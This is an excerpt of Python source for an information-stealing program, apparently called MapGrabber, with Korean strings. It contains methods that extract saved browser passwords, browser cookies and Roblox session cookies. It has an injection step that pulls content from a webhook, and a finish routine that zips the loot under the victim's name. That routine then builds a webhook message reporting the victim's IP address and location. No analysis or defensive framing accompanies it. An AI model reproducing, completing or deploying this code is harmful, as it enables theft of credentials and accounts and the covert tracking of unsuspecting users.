...
class MapGrabber(functions):
                    ...
                    if match(r'app-(\d*\.\d*)*', __dir):
                        ...
                        if os.path.exists(inj_path):
                            if self.startup_loc not in argv[0]:
                                try:
                                    os.makedirs(
                                        inj_path+'MapBTW', exist_ok=True)
                                except PermissionError:
                                    pass
                            f = httpx.get(self.fetchConf('Webhook')).text.replace(
    ...
    def grabPassword(self):
        ...
        cursor = conn.cursor()
        with open(self.dir+"\\구글 비밀번호.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
    ...
    def grabCookies(self):
        ...
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\구글 쿠키.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
    ...
    def grabRobloxCookie(self):
        ...
        if self.robloxcookies:
            with open(self.dir+"\\로블록스 쿠키.txt", "w") as f:
    ...
    def finish(self):
        ...
        _zipfile = os.path.join(
            self.appdata, f'File-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for MapBTW in files:
                absname = os.path.abspath(os.path.join(dirname, MapBTW))
        ...
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)}개의 파일을 찾았습니다: "
        embed = {
            'username'
            'avatar_url': '',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* 이(가) 해킹 프로그램을 열었습니다 !',
                        'url': '',  
                        'icon_url': ''
                    },
                    'color': 16119101,
                    'description': f'[구글 맵 링크]({googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                아이피:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
                                도메인:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
                                도시:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
                                지역:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
                                나라:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
